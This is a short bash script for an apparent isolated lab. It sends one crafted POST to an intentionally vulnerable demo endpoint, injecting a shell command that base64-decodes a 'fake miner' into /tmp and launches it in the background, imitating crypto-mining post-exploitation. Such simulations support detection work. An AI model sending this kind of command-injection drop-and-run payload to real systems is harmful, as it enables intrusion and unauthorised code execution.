#!/usr/bin/env bash
# =============================================================================
#  attack.sh  --  drives the SIMULATED attack against the demo app.
#  Sends ONE POST to the intentionally-vulnerable endpoint. The command it
#  makes the pod run: write the harmless miner to /tmp, rename it "xmrig",
#  and launch it. This reproduces the BEHAVIOUR of a crypto-mining post-exploit
#  (shell + /tmp drop + miner + outbound mining port) with no real exploit and
#  no real mining. Isolated lab use only.
# =============================================================================
set -euo pipefail
TARGET="${1:-http://localhost:30080}"
DIR="$(cd "$(dirname "$0")" && pwd)"

# Base64 the miner so we never fight shell quoting (base64 is JSON/shell safe).
B64="$(base64 -w0 "$DIR/fake-miner.sh" 2>/dev/null || base64 "$DIR/fake-miner.sh" | tr -d '\n')"

# What the vulnerable endpoint will run inside the pod (node spawns /bin/sh -c):
#   decode -> /tmp/workload-sim, make executable, run in background.
CMD="echo ${B64} | base64 -d > /tmp/workload-sim && chmod +x /tmp/workload-sim && nohup sh /tmp/workload-sim >/tmp/workload.log 2>&1 &"

echo "[*] Sending crafted request to ${TARGET}/api/action ..."
curl -s -X POST "${TARGET}/api/action" \
  -H 'next-action: 7f3a9b2c' \
  -H 'content-type: application/json' \
  --data "{\"cmd\": \"${CMD}\"}" || true
echo
echo "[*] Sent. Inside the pod that request just: spawned a shell, wrote"
echo "    /tmp/workload, and launched it"
